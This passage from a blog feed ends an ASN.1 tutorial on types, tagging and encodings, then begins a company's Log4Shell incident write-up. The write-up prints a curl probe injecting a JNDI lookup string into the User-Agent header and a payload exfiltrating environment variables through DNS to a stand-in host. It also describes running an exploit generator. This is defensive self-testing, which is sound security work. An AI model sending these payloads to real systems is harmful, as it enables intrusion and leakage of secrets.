       (SETTINGS &quot;Basic=Time Time=HMS Local-or-UTC=L&quot;)
DATE-TIME ::= [UNIVERSAL 33] IMPLICIT TIME
       (SETTINGS &quot;Basic=Date-Time Date=YMD Year=Basic Time=HMS Local-or-UTC=L&quot;)
DURATION ::= [UNIVERSAL 34] IMPLICIT TIME
       (SETTINGS &quot;Basic=Interval Interval-type=D&quot;)
</code></pre><p>As I can find no real world examples from our ASN.1-files, I&#x27;m forced
to make-up examples of these</p><pre><code class="language-asn.1">date1 DATE ::= &quot;211214&quot;
time1 TIME-OF-DAY ::= &quot;043227&quot;
date-time1 DATE-TIME ::= &quot;211214043227&quot;
duration1 DURATION ::= &quot;P0Y29M0DT0H0M0S&quot; -- 29 months to an accuracy of 1 second
</code></pre><p>Values of type <code>DURATION</code> starts with &quot;P&quot; followed by alot of
different optional parts and formats.  If the time designation is used
it should start with a &quot;T&quot; to keep months and minutes separate.</p><pre><code class="language-asn.1">duration2 DURATION ::= &quot;P2MT2M&quot; -- 2 months and 2 minutes
duration3 DURATION ::= &quot;P29M0DT0.00M&quot; -- 29 months with accuracy of one-hundredth of a minute
duration4 DURATION ::= &quot;P32W&quot; -- 32 weeks
</code></pre><h2>Structured types</h2><h3>CHOICE</h3><p>The type <code>CHOICE</code> can take values from one of multiple types, <code>CHOICE</code>
doesn&#x27;t have it&#x27;s own universal tag.</p><pre><code class="language-asn.1">CancelArg ::= CHOICE {
    invokeID        [0] InvokeID,
    allRequests     [1] NULL
}
</code></pre><p>The value of type <code>CancelArg</code> will either of an <code>InvokeID</code> type, or a
<code>NULL</code> type.  It will be tagged <code>[0]</code> or <code>[1]</code> respectively, that is
why <code>CHOICE</code> doesn&#x27;t have it&#x27;s own universal tag, as it is derived
from ASN.1 specification.</p><h3>SEQUENCE (OF)</h3><p><code>SEQUENCE</code> and <code>SEQUENCE OF</code> are used for composing multiple types.</p><pre><code class="language-asn.1">EventTypeSMS ::= ENUMERATED {
    sms-CollectedInfo                   (1),
    o-smsFailure                        (2),
    o-smsSubmission                     (3),
    sms-DeliveryRequested               (11),
    t-smsFailure                        (12),
    t-smsDelivery                       (13)
}
MonitorMode ::= ENUMERATED {
    interrupted                         (0),
    notifyAndContinue                   (1),
    transparent                         (2)
}

SMSEvent ::= SEQUENCE {
    eventTypeSMS   [0] EventTypeSMS,
    monitorMode    [1] MonitorMode
}

Tone ::= SEQUENCE {
    toneID         [0] Integer4,
    duration       [1] Integer4 OPTIONAL,
    ...
}
</code></pre><p>A value of the <code>SMSEvent</code> type have information on both <code>EventTypeSMS</code>
and <code>MonitorMode</code>. The fixed number of fields in the <code>SEQUENCE</code> type
are ordered.  Context-specific tagging (e.g. the <code>[0]</code>, <code>[1]</code>, <code>[2]</code>
stuff in the examples), is frequently applied for the structured
types, but one could also utilize the keywords <code>AUTOMATIC TAGGING</code> in
the module definition.</p><p><code>SEQUENCE OF</code> on the other hand, holds an arbitrary number of fields
of a single type.</p><pre><code class="language-asn.1">FilterItem ::= CHOICE {
    equality         [0] AttributeValueAssertion,
    substrings       [1] SEQUENCE {
        type    ATTRIBUTE.&amp;id({SupportedAttributes}),
        strings SEQUENCE OF CHOICE {
            initial [0] ATTRIBUTE.&amp;Type({SupportedAttributes}{@substrings.type}),
            any     [1] ATTRIBUTE.&amp;Type({SupportedAttributes}{@substrings.type}),
            final   [2] ATTRIBUTE.&amp;Type({SupportedAttributes}{@substrings.type})
        }
    },
    greaterOrEqual   [2] AttributeValueAssertion,
    lessOrEqual      [3] AttributeValueAssertion,
    present          [4] AttributeType,
    approximateMatch [5] AttributeValueAssertion,
    extensibleMatch  [6] MatchingRuleAssertion
}
</code></pre><p>In the quite complex example above we see that the type <code>FilterItem</code>
is of type <code>CHOICE</code> and can take subtype called <code>strings</code>. <code>strings</code>
is of type <code>SEQUENCE OF CHOICE</code> which means it can take a list of
zero, one or more of <code>initial</code>, <code>any</code> or <code>final</code>. The example is quite
complex because it also uses multiple parameterized values. see
<a href="#automatic-implicit-explicit-tags">Automatic, Implicit, Explicit tags</a></p><p>We find another example in the DialoguePDUs module from
<a href="https://www.itu.int/rec/T-REC-Q.773-199706-I/en">Q.773</a> where the
AARQ is of type <code>SEQUENCE</code>, and the third field <code>user-information</code> is
an <code>SEQUENCE OF</code> <code>EXTERNAL</code> type.</p><pre><code class="language-asn.1">AARQ-apdu ::= [APPLICATION 0] IMPLICIT SEQUENCE {
  protocol-version
    [0] IMPLICIT BIT STRING {version1(0)} DEFAULT {version1},
  application-context-name  [1]  OBJECT IDENTIFIER,
  user-information          [30] IMPLICIT SEQUENCE OF EXTERNAL OPTIONAL
}
</code></pre><p>They are quite different in how they are used, but they are encoded in
a similar way. Some languages represent <code>SEQUENCE</code> internally as a
<code>struct</code>, and <code>SEQUENCE OF</code> as an array, but encoded they would look
quite similar.</p><h3>SET (OF)</h3><p><code>SET</code> and <code>SET OF</code> are similar to <code>SEQUENCE</code> and <code>SEQUENCE OF</code>
respectively. The difference is that the composite types are
unordered.</p><p>From <code>CAP-datatypes</code> we find an example of a <code>SET OF</code> with a
<a href="#parameterized-components">parameterized component</a> specifying a size
constraint.</p><pre><code class="language-asn.1">GenericNumbers {PARAMETERS-BOUND : bound} ::= SET SIZE(1..bound.&amp;numOfGenericNumbers) OF GenericNumber {bound}
</code></pre><p>Or an example of a value from the <code>TCAP-Tools</code> module in
<a href="https://www.itu.int/rec/T-REC-Q.775-199706-I/en">Q.775</a></p><pre><code class="language-asn.1">cancelFailed ERROR ::= {
  PARAMETER
    SET {problem   [0]  CancelProblem,
         invokeId  [1]  present &lt; TCInvokeIdSet
    }
}
</code></pre><h3>SELECTION</h3><p>The SELECTION type <code>&lt;</code> is used when one want&#x27;s to obtain one of the
possible subtypes of a <code>CHOICE</code> definition.</p><p>If we expand the previous example from the <a href="#set-of">SET</a></p><pre><code class="language-asn.1">cancel OPERATION ::= {
  ARGUMENT  present &lt; TCInvokeIdSet
  ERRORS    {cancelFailed}
}

cancelFailed ERROR ::= {
  PARAMETER
    SET {problem   [0]  CancelProblem,
         invokeId  [1]  present &lt; TCInvokeIdSet
    }
}
</code></pre><p>we see that the <code>ARGUMENT</code> type and the invokeId field take the type
from the <code>present</code> field in the <code>TCInvokeIdSet</code> type.</p><p>the definition of <code>TCInvokeIdSet</code> is as follows</p><pre><code class="language-asn.1">InvokeId ::= CHOICE {present  INTEGER,
                     absent   NULL
}

TCInvokeIdSet ::= InvokeId(WITH COMPONENTS {
                             present  (-128..127)
                           })
</code></pre><p>Thus <code>invokeId</code> and <code>ARGUMENT</code> fields will take integer values which
are between -128 and 127.</p><h1>Other concepts</h1><h2>DEFAULT and OPTIONAL keywords</h2><p>One can use the <code>DEFAULT</code> keyword in order to specify the default value.</p><pre><code class="language-asn.1">CollectedDigits ::= SEQUENCE {
  minimumNbOfDigits    [0] INTEGER (1..16) DEFAULT 1,
  maximumNbOfDigits    [1] INTEGER (1..16),
  endOfReplyDigit      [2] OCTET STRING (SIZE (1..2)) OPTIONAL,
  cancelDigit          [3] OCTET STRING (SIZE (1..2)) OPTIONAL,
  startDigit           [4] OCTET STRING (SIZE (1..2)) OPTIONAL,
  firstDigitTimeOut    [5] INTEGER (1..127) OPTIONAL,
  interDigitTimeOut    [6] INTEGER (1..127) OPTIONAL,
  errorTreatment       [7] ErrorTreatment DEFAULT stdErrorAndInfo,
  interruptableAnnInd  [8] BOOLEAN DEFAULT TRUE,
  voiceInformation     [9] BOOLEAN DEFAULT FALSE,
  voiceBack            [10] BOOLEAN DEFAULT FALSE
}
</code></pre><p>In this example we see the type <code>CollectedDigits</code> where most of the
values are either <code>DEFAULT</code> or <code>OPTIONAL</code>. The only value that needs
to be set is <code>maximumNbOfDigits</code>.</p><h2>Classes</h2><p>One can also use informal object classes in order to specify and
define values for general types.</p><pre><code class="language-asn.1">OPERATION ::= CLASS {
  &amp;ArgumentType          OPTIONAL,
  &amp;argumentTypeOptional  BOOLEAN OPTIONAL,
  &amp;returnResult          BOOLEAN DEFAULT TRUE,
  &amp;ResultType            OPTIONAL,
  &amp;resultTypeOptional    BOOLEAN OPTIONAL,
  &amp;Errors                ERROR OPTIONAL,
  &amp;Linked                OPERATION OPTIONAL,
  &amp;synchronous           BOOLEAN DEFAULT FALSE,
  &amp;alwaysReturns         BOOLEAN DEFAULT TRUE,
  &amp;InvokePriority        Priority OPTIONAL,
  &amp;ResultPriority        Priority OPTIONAL,
  &amp;operationCode         Code UNIQUE OPTIONAL
}
WITH SYNTAX {
  [ARGUMENT &amp;ArgumentType
   [OPTIONAL &amp;argumentTypeOptional]]
  [RESULT &amp;ResultType
   [OPTIONAL &amp;resultTypeOptional]]
  [RETURN RESULT &amp;returnResult]
  [ERRORS &amp;Errors]
  [LINKED &amp;Linked]
  [SYNCHRONOUS &amp;synchronous]
  [ALWAYS RESPONDS &amp;alwaysReturns]
  [INVOKE PRIORITY &amp;InvokePriority]
  [RESULT-PRIORITY &amp;ResultPriority]
  [CODE &amp;operationCode]
}

provideRoutingInformation OPERATION ::= {
  ARGUMENT  RequestArgument
  RESULT    RoutingInformation
  ERRORS
    {invalidCalledNumber | subscriberNotReachable | calledBarred |
      processingFailure}
  LINKED    {getCallingPartyAddress}
}

getCallingPartyAddress OPERATION ::= {
  RESULT  CallingPartyAddress
  ERRORS  {callingPartyAddressNotAvailable | processingFailure}
}

invalidCalledNumber ERROR ::= {CODE  local:1}
subscriberNotReachable ERROR ::= {CODE  local:2}

RequestArgument ::= SEQUENCE {
  calledNumber  IsdnNumber,
  basicService  BasicServiceIndicator OPTIONAL
}

RoutingInformation ::= CHOICE {
  reroutingNumber    [0] IMPLICIT IsdnNumber,
  forwardedToNumber  [1] IMPLICIT IsdnNumber
}

</code></pre><p>In the above <code>OPERATION</code> class, a syntax is defined for the
class. This class and syntax can then be used to define specific
values, for instance the <code>provideRoutingInformation</code> and
<code>getCallingPartyAddress</code> values.</p><p>We also glimse another class in the above example which I didn&#x27;t
include. Can you find it?</p><h2>Parameterized components</h2><p>Another way to make the specs more generalized is to use parameterized
components. We&#x27;ve already seen a couple of examples of such, see the
chapter for the <a href="#null">NULL</a>, <a href="#external">EXTERNAL</a> and <a href="#set-of">SET
(OF)</a> types.</p><p>Let&#x27;s look at the example from <code>SET OF</code> again.</p><pre><code class="language-asn.1">GenericNumbers {PARAMETERS-BOUND : bound} ::= SET SIZE(1..bound.&amp;numOfGenericNumbers) OF GenericNumber {bound}

GenericNumber {PARAMETERS-BOUND : bound} ::= OCTET STRING (SIZE(
    bound.&amp;minGenericNumberLength .. bound.&amp;maxGenericNumberLength))
</code></pre><p><code>GenericNumbers</code> take a parameter <code>bound</code> of the type <code>PARAMETERS-BOUND</code> as input.</p><p><code>PARAMETERS-BOUND</code> is defined as a class with a lot of different
integer values, so I&#x27;ve minimized the class a bit.</p><pre><code class="language-asn.1">PARAMETERS-BOUND ::= CLASS {
    --- a lot of other fields
    &amp;minGenericNumberLength  INTEGER,
    &amp;maxGenericNumberLength  INTEGER,
    &amp;numOfGenericNumbers     INTEGER,
}

WITH SYNTAX {
    --- a lot of other fields
    MINIMUM-FOR-GENERIC-NUMBER  &amp;minGenericNumberLength
    MAXIMUM-FOR-GENERIC-NUMBER  &amp;maxGenericNumberLength
    NUM-OF-GENERIC-NUMBERS      &amp;numOfGenericNumbers
}
</code></pre><p>One could then specify different values using the <code>PARAMETERS-BOUND</code>
class to reuse the <code>GenericNumber</code> and <code>GenericNumbers</code> types.</p><pre><code class="language-asn.1">cAPSpecificBoundSet PARAMETERS-BOUND ::= {
    --- again, lots of other values
    MINIMUM-FOR-GENERIC-NUMBER                  3
    MAXIMUM-FOR-GENERIC-NUMBER                  11
    NUM-OF-GENERIC-NUMBERS                      5
}
</code></pre><p>If one would pass <code>cAPSpecificBoundSet</code> to a value of type
<code>GenericNumbers</code>, it would define an instance which holds 1-5
<code>GenericNumber</code>s of 3-11 octets.</p><p>Quite powerful if you have multiple definitions which uses similar
structure.</p><h2>Extensions</h2><p>Sometimes you will need to support different versions of a protocol
(or someone else need to support different version, and you just need
to read the types of the protocol), and maybe the new version need to
extend some types in order to include more information. Then without
redefining everything and copy the previous version of the type to the
new version of the type one can use extension markers (syntax <code>...</code>).</p><p>Take the <code>QosMonitoringRequest</code> type below as an example. In the first
version of the protocol (NGAP if you really want to know), the
<code>QoSMonitoringRequest</code> could take only enums <code>ul</code>, <code>dl</code>, or <code>both</code>.
However, in a subsequent version it was extended with a new enum
<code>stop</code>. With the extension marker <code>...</code> the v1-compilers can handle
the first three enums, and the v2-compilers can handle all enums from
v1 but also the <code>stop</code> enum.</p><pre><code class="language-asn.1">QosMonitoringRequest ::= ENUMERATED {
    ul,
    dl,
    both,
    ...
} -- version 1

QosMonitoringRequest ::= ENUMERATED {
    ul,
    dl,
    both,
    ...,
    stop
} -- version 2
</code></pre><p>For enums, if there is yet a newer version, say version 3 of this type
one, you should just add the new enum under the previous enums.</p><pre><code class="language-asn.1">QosMonitoringRequest ::= ENUMERATED {
    ul,
    dl,
    both,
    ...,
    stop,
    half
} -- imaginary version 3
</code></pre><p>For <code>SEQUENCE</code>, <code>SET</code> and <code>CHOICE</code> one could either do the same, or to
keep the versions separated, add another extension mark with the new
fields in between. One could also add version brackets to group the
extensions and highlight the differences.</p><pre><code class="language-asn.1">Ax ::= SEQUENCE {
    a INTEGER (250..253),
    b BOOLEAN,
    c CHOICE {
        d INTEGER, -- version 1
        ...,
        [[
            e BOOLEAN,
            f IA5String
        ]],
        ... -- version 2
    },
    ..., -- version 1
    [[
        g NumericString (SIZE(3)),
        h BOOLEAN OPTIONAL
    ]],
    ..., -- version 2
    i BMPString OPTIONAL,  -- version 3
    j PrintableString OPTIONAL -- version 3
}

</code></pre><p>Only the types <code>ENUMERATED</code>, <code>SEQUENCE</code>, <code>SET</code> and <code>CHOICE</code>, as well
as subtype constraints, and object and value sets can be extended.</p><h2>Automatic, Implicit, Explicit tags</h2><p>When an value is transmitted all ambiguities need to be removed. That
is why every type needs to have an unique identifier, called a tag.</p><p>The section <a href="#default-and-optional-keywords">DEFAULT and OPTIONAL
keywords</a> has a good example I will
explain.</p><pre><code class="language-asn.1">CollectedDigits ::= SEQUENCE {
  minimumNbOfDigits    [0] INTEGER (1..16) DEFAULT 1,
  maximumNbOfDigits    [1] INTEGER (1..16),
  endOfReplyDigit      [2] OCTET STRING (SIZE (1..2)) OPTIONAL,
  cancelDigit          [3] OCTET STRING (SIZE (1..2)) OPTIONAL,
  startDigit           [4] OCTET STRING (SIZE (1..2)) OPTIONAL,
  firstDigitTimeOut    [5] INTEGER (1..127) OPTIONAL,
  interDigitTimeOut    [6] INTEGER (1..127) OPTIONAL,
  errorTreatment       [7] ErrorTreatment DEFAULT stdErrorAndInfo,
  interruptableAnnInd  [8] BOOLEAN DEFAULT TRUE,
  voiceInformation     [9] BOOLEAN DEFAULT FALSE,
  voiceBack            [10] BOOLEAN DEFAULT FALSE
}
</code></pre><p>In this sequence we can see that many of the values are optional and
some have defaults, only the value <code>maximumNbOfDigits</code> is mandatory.</p><p>When the sending side transmits a value of <code>CollectedDigits</code> type, the
receiving side will get a sequence of the values mentioned. With
BER-encoding each defined value will have an identifier, a length (of
the value transmitted) and the value. This is called a
Tag-Length-Value or TLV for short.</p><p>All basic types already has an universal tag as stated in the <a href="#types">types
table</a>, but the composite types does not. (If not tagged, how
would it see the difference between <code>endOfReplyDigit</code>, <code>cancelDigit</code>
and <code>startDigit</code> in the example above?)</p><pre><code class="language-asn.1">RoutingInformation ::= CHOICE {
  reroutingNumber    [0] IMPLICIT IsdnNumber,
  forwardedToNumber  [1] IMPLICIT IsdnNumber
}

IsdnNumber ::= SEQUENCE {
  typeOfAddress  TypeOfAddress,
  digits         TelephonyString
}

TypeOfAddress ::= ENUMERATED {national(0), international(1), private(2)}

TelephonyString ::=
  IA5String
    (FROM (&quot;0&quot; | &quot;1&quot; | &quot;2&quot; | &quot;3&quot; | &quot;4&quot; | &quot;5&quot; | &quot;6&quot; | &quot;7&quot; | &quot;8&quot; | &quot;9&quot; | &quot;*&quot; |
           &quot;#&quot;))(SIZE (1..15))

</code></pre><p>A value of <code>RoutingInformation</code> in this example will with BER encoding
only transmit the tag <code>[0]</code> or <code>[1]</code> (and of course the length and
value). It counts on that the receiving part has the same version of
the ASN.1 and knows the abstract syntax. If it wouldn&#x27;t have been
<code>IMPLICIT</code>, then it would have sent either tags <code>[0]</code> or <code>[1]</code>
followed by the tags for <code>TypeOfAddress</code> (ENUMERATED) <code>[10]</code>, and tags
for <code>TelephonyString</code> (IA5String) <code>[4]</code>.</p><p>One can specify <code>IMPLICIT</code> and <code>EXPLICIT</code> tagging on module basis,
where the <code>DEFINITIONS</code> are assigned.</p><pre><code class="language-asn.1">DEFINITIONS IMPLICIT TAGS ::= BEGIN
</code></pre><p>Instead of writing all the tags self (explicitly in both cases), one
can instead use the keywords <code>AUTOMATED TAGS</code>.</p><pre><code class="language-asn.1">DEFINITIONS AUTOMATIC TAGS ::= BEGIN
</code></pre><p>This will add tags to the composit types that doesn&#x27;t have them
(explicitly) set.</p><h2>Deprecations and discouragements</h2><p>Some things have been deprecated from earlier ASN.1 specifications,
and use of these are strongly discouraged.</p><h3>ANY</h3><p>First out is the <code>ANY</code> type, which could take the form of any
value. It&#x27;s like an unrestricted <code>CHOICE</code> type.</p><pre><code class="language-asn.1">Invoke ::= SEQUENCE {
    invokeID           InvokeIdType,
    linkedID       [0] InvokeIdType OPTIONAL,
    operationCode      MAP-OPERATION,
    parameter          InvokeParameter OPTIONAL
}
InvokeParameter ::= ANY
</code></pre><p>Problem with this is that the ASN.1 compiler does not have a formal
way of knowing which values are approved. The use of <code>ANY</code> also
usually meant it was coupled with some other value, for instance the
<code>operationCode</code> in the example above.</p><p>To make this link one could have used <code>DEFINED BY</code> specifying which
field the <code>ANY</code> type is coupled with. The drawback with this solution
is that it still has an ambiguous meaning, and the types are of no use
for the application designer.</p><pre><code class="language-asn.1">ExtensionField ::= SEQUENCE {
    type        INTEGER,
    --  shall identify the value of an EXTENSION type
    criticality ENUMERATED {
        ignore(0),
        abort(1)
    } DEFAULT ignore,
    value   [1] ANY DEFINED BY type
}
</code></pre><p>Instead the concept of informal object classes and parameterized
components were introduced.</p><h3>Macros</h3><p>Macros were removed because they were poorly documented and too
general. Because of this they were hard to implement and automate in
the compilers. They follow the BNF notation.</p><pre><code class="language-asn.1">OPERATION MACRO ::=
BEGIN
    TYPE NOTATION ::= Parameter Result Errors LinkedOperations
    VALUE NOTATION ::= value (VALUE CHOICE { localValue INTEGER, globalValue OBJECT IDENTIFIER } )
    Parameter ::= ArgKeyword NamedType | empty
    ArgKeyword ::= &quot;ARGUMENT&quot; | &quot;PARAMETER&quot;
    Result ::= &quot;RESULT&quot; ResultType | empty
    Errors ::= &quot;ERRORS&quot; &quot;{&quot;ErrorNames&quot;}&quot; | empty
    LinkedOperations ::= &quot;LINKED&quot; &quot;{&quot;LinkedOperationNames&quot;}&quot; | empty
    ResultType ::= NamedType | empty
    ErrorNames ::= ErrorList | empty
    ErrorList ::= Error | ErrorList &quot;,&quot; Error
    Error ::= value (ERROR)
             -- shall reference an error value
             | type
             -- shall reference an error type
             -- if no error value is specified
    LinkedOperationNames ::= OperationList | empty
    OperationList ::= Operation | OperationList &quot;,&quot; Operation
    Operation ::= value (OPERATION)
                  -- shall reference an operation value
                  | type
                  -- shall reference an operation type if
                  -- no operation value is specified
    NamedType ::= identifier type | type
END
</code></pre><p>The two needed fields of the macro are <code>TYPE NOTATION</code> and <code>VALUE
NOTATION</code>. The rest of the fields are the value sequence defining what
the macro should insert. Quotes define the string to insert (excluding
the actual quotes), <code>empty</code> inserts nothing. <code>identifier</code>, <code>value</code>, or
<code>type</code> are used to infer different things. Dubuisson has (yet again) a
good chapter on this topic.</p><p>Also here one should use informal object classes and parameterized
components instead of using macros.</p><h1>Encodings</h1><p>There are numerous codecs when transmitting the abstract syntax, all
with different pros and cons.</p><table><thead><tr><th>Short name</th><th>Long name</th></tr></thead><tbody><tr><td>BER</td><td>Basic encoding rules</td></tr><tr><td>DER</td><td>Distinguished encoding rules</td></tr><tr><td>CER</td><td>Canonical encoding rules</td></tr><tr><td>PER</td><td>Packed encoding rules</td></tr><tr><td>OER</td><td>Octet encoding rules</td></tr><tr><td>XER</td><td>XML encoding rules</td></tr><tr><td>EXER</td><td>Extended XML encoding rules</td></tr><tr><td>JER</td><td>JSON encoding rules</td></tr></tbody></table><p>BER is the oldest encoding rule for ASN.1. It uses Tag-Length-Value
format where all tags, lengths and values are multiples of
octets. Because this was the first encoding rule it was named <code>basic</code>
to indicate that there might be more standardized encoding rules in
the future.</p><p>DER and CER are subsets of BER, which was added for developers of
X.400 email and X.500 directory applications. It provides means to
make sure bit strings are not altered during transfer. The main
difference between DER and CER is that DER uses a definite-length
format and CER an indefinite-length format, so CER is best used for
applications that transfer a big amount of data.</p><p>PER is the most compact format, and used for bandwith conservation. It
does not send the Tag of the TLV because the order in which components
of the message occur is known.  PER also does not send the Length of
the TLV if the Value has a fixed length. It uses information from
ASN.1 message description to eliminate redundant information from the
Value portion. It can either be aligned to multiple of octets by
padding each value with &#x27;0&#x27;s, or unaligned (U-PER/Unaligned PER) which
is more compact but take more time to decode.</p><p>OER was adapted from PER and uses an octet oriented format, so the
length of all specified Tags, Lengths, and Values are padded to be
multiples of 8 bits octets as in BER. OER is usually faster than both
BER and PER with regards to encoding and decoding.</p><p>XER, CXER and EXER are used for transmitting XML format. CXER is used
for transmitting data canonically, e.g. used by security applications.
EXER or Extended XER is used when &quot;stylish&quot; features is wanted, and
adds possibility to extend the encoder for instance when wanting to
insert processing instructions or comments into the XML.</p><p>JER is used when transmitting JSON in accordance to the format
specified in
<a href="https://www.ecma-international.org/publications-and-standards/standards/ecma-404/">ECMA-404</a>.</p><p>There are probably a bunch of others as well, but these are the ones
that have a specification.</p><table><thead><tr><th>ITU-T number</th><th>Name</th></tr></thead><tbody><tr><td><a href="https://www.itu.int/rec/T-REC-X/recommendation.asp?lang=en&amp;parent=T-REC-X.690">X.690</a></td><td>ASN.1 encoding rules: Specification of Basic Encoding Rules (BER), Canonical Encoding Rules (CER) and Distinguished Encoding Rules (DER)</td></tr><tr><td><a href="https://www.itu.int/rec/T-REC-X/recommendation.asp?lang=en&amp;parent=T-REC-X.691">X.691</a></td><td>ASN.1 encoding rules: Specification of Packed Encoding Rules (PER)</td></tr><tr><td><a href="https://www.itu.int/rec/T-REC-X/recommendation.asp?lang=en&amp;parent=T-REC-X.692">X.692</a></td><td>ASN.1 encoding rules: Specification of Encoding Control Notation (ECN)</td></tr><tr><td><a href="https://www.itu.int/rec/T-REC-X/recommendation.asp?lang=en&amp;parent=T-REC-X.693">X.693</a></td><td>ASN.1 encoding rules: XML Encoding Rules (XER)</td></tr><tr><td><a href="https://www.itu.int/rec/T-REC-X/recommendation.asp?lang=en&amp;parent=T-REC-X.694">X.694</a></td><td>ASN.1 encoding rules: Mapping W3C XML schema definitions into ASN.1</td></tr><tr><td><a href="https://www.itu.int/rec/T-REC-X/recommendation.asp?lang=en&amp;parent=T-REC-X.695">X.695</a></td><td>ASN.1 encoding rules: Registration and application of PER encoding instructions</td></tr><tr><td><a href="https://www.itu.int/rec/T-REC-X/recommendation.asp?lang=en&amp;parent=T-REC-X.696">X.696</a></td><td>ASN.1 encoding rules: Specification of Octet Encoding Rules (OER)</td></tr><tr><td><a href="https://www.itu.int/rec/T-REC-X/recommendation.asp?lang=en&amp;parent=T-REC-X.697">X.697</a></td><td>ASN.1 encoding rules: Specification of JavaScript Object Notation Encoding Rules (JER)</td></tr></tbody></table><h1>Final words</h1><p>Congratulations for making through this blog post. You deserve a
medal, and I hope this can help you understand the complexity and
greatness of ASN.1.</p><p>We have gone through the <strong>basics</strong> of ASN.1, there are still a lot of
things to be uncovered. You now understand the most common basic and
structured types, as well as the main differences between the
different encodings.</p><p>If I write a part 2 I will take you through the Diameter specs
instead, which are much more straighforward.</p><p>Image from <a href="https://xkcd.com">xkcd</a> describing how I feel with ASN.1:</p><a class="image" href="https://xkcd.com/208/"><img src="https://imgs.xkcd.com/comics/regular_expressions.png"/></a>]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Zero-day vulnerabilities - Log4j]]></title>
            <link>https://www.wgtwo.com/blog/log4j-security-vulnerability</link>
            <guid>log4j-security-vulnerability</guid>
            <pubDate>Fri, 17 Dec 2021 00:00:00 GMT</pubDate>
            <description><![CDATA[On Friday, December 10th, wgtwo and many others became aware of a critical severity zero-day exploit, CVE-2021-44228, known as “Log4Shell” in the Log4j library, which is widely used in numerous systems around the internet. We immediately opened a security incident and have been actively taking steps to mitigate and monitor the situation.]]></description>
            <content:encoded><![CDATA[<p>On Friday, December 10th, <strong>wgtwo</strong> and many others became aware of a critical severity zero-day exploit, CVE-2021-44228, known as “Log4Shell” in the Log4j library, which is widely used in numerous systems around the internet. We immediately opened a security incident and have been actively taking steps to mitigate and monitor the situation. </p><h1>Table of Contents</h1><p><a href="#friday">Friday</a></p><ul><li><a href="#code">Code</a>  </li><li><a href="#docker-vulnerability-scan-day-1">Docker Vulnerability Scan Day 1</a>  </li></ul><p><a href="#saturday">Saturday</a></p><ul><li><a href="#checking-our-infrastructure-ourselves-with-DNS-requests">Checking our infrastructure ourselves with DNS requests</a>  </li><li><a href="#log-analysis-and-alerting">Log Analysis and Alerting</a>  </li></ul><p><a href="#monday">Monday</a></p><ul><li><a href="#docker-vulnerability-scans">Docker Vulnerability Scans</a>  </li><li><a href="#monitoring-vendors">Monitoring vendors</a>  </li></ul><p><a href="#what-worked-well-and-could-be-improved">What worked well and could be improved</a><br/>
<a href="#staying-secure">Staying secure</a><br/>
<a href="#we-are-hiring">We are hiring</a>  </p><h1>Friday</h1><p>Mitigating 3rd party vulnerabilities is an ability that <strong>wgtwo</strong> has prepared for. The first step in doing so is to assess the impact of the Log4j library across our microservice architecture. </p><p>We knew that all versions of Log4j <code>2.0-beta9 &lt;= Apache log4j &lt;= 2.14.1</code> were affected. </p><h2>Code</h2><p>Naturally, the first place to look was our codebase and answer the question, do we have java microservices using log4j? Our core application code exists in a monorepo. Having a monorepo makes it easier as there is one place to look. In addition, we use bazel which helps for managing dependencies. After a quick scan through our repo, we found that we had a vulnerable version of log4j as a dependency, but was not used by a service. We cleaned this up and removed Log4j entirely.</p><h2>Docker Vulnerability Scan Day 1</h2><p>We use Trivy as our Docker vulnerability scanner. We have integrated this scanner as part of our docker image registry. </p><p>At a first pass, all scans were negative across our infrastructure and we thought we were in the clear. We later identified that this was a false positive as Trivy’s database is only updated every 6 hours and did not include CVE-2021-44228 for around 48 hours after first identified. </p><h1>Saturday</h1><h2>Checking our infrastructure ourselves with DNS requests</h2><p>At that moment, we want to also evaluate ourselves if we are vulnerable. The early report of log4j exploitation showed that attackers were abusing the user-agent field of public endpoints, such as HTTP endpoints. Those endpoints are often logged using the Apache format, which exposes the user agent and the URL in the logs. In turn, those logs could be post-processed via a component using Log4j.</p><p>One harmless way to detect vulnerability is to exercise the JNDI resolver, that is to say, to have log4j perform the DNS request toward the java object. Thinkst folks are providing Canary Tokens service in a free tier fashion, and inside, there is a DNS token:</p><p><img src="/img/blog/log4j/01-canary-tokens.png"/></p><p>If a DNS resolution is performed on the unique DNS hostname, we would get a callback or an email. After generating the token, we quickly proceed to probe our infrastructure:</p><pre><code>curl https://docs.wgtwo.com  -A &quot;\${jndi:ldap://randomlygeneratedhostname.canarytokens.com/a}&quot;
</code></pre><p>After executing the command, we shortly received the notification from CanaryTokens. It means one of our elements of the infrastructure stack is relying on log4j. Nevertheless, we need to assess if the vulnerability is exploitable, so we check the Infosec literature.</p><p>JNDI stands for Java Naming and Directory Interface - it is a system designed to look up for data and resources, i.e. such as Java bytecode. It might sound wrong to the 2021 engineers but back in 2000 Java RMI, CORBA etc were very trendy concepts for discovering and executing code in a dynamic fashion - think like Javascript or ActiveX applets in the browser world. </p><p>Going back to our problem, we quickly found this <a href="https://github.com/veracode-research/rogue-jndi">Rogue JNDI</a>. This is basically an exploit generator that creates a fake LDAP server, replying with Java class objects that will be executed by log4j on object retrieval.  After building a quick docker image, we ran this exploit on an external host and execute several calls to check all the proposed types of payload:</p><p><img src="/img/blog/log4j/02-supported-payloads.png"/></p><p>In particular, RemoteReference did not yield to any execution, which means probably the JVM used to run the affected Java component is either too recent or not configured to execute code via known remote methods. This gives us some time, but we are still exposed to information leakage as an attacker can still exfiltrate env variables via DNS queries - i.e. log4j would resolve environment variables and would embed them in a query, such as: </p><pre><code>${jndi:ldap://${env:JAVA_VERSION}.dnsresolver.foo}
</code></pre><p>Then, we should proceed to:
1) Identify if the affected components are in our stack or in the cloud provider
2) Apply mitigation  </p><ul><li>Either via WAF - firewall rules on traffic.   </li><li>Either via known mitigation on the log4g components<ul><li>Environment variable / JVM options</li><li>Java class removal</li><li>Full component upgrade</li></ul></li></ul><p>For (1), we started to observe all our log components and run network monitoring for a specific TCP flow on a controlled external host (i.e. running tcpdump toward a specific IP/port). We quickly noticed that a pod for one of DaemonSet was the culprit. This component was embedding logstash which is using Java and log4j. </p><p>Assuming this was the only element, we proceed to apply mitigation:
We discard the WAF approach as too complex and not providing enough coverage. We indeed saw later obfuscation of the <code>jndi:ldap</code> string used to trigger the vulnerability.
The environment variable / JVM options were the quickest to deploy, but yielded no result. Later on, the Elastic Log4j CVE dedicated page mentioned that the mitigation was ineffective.
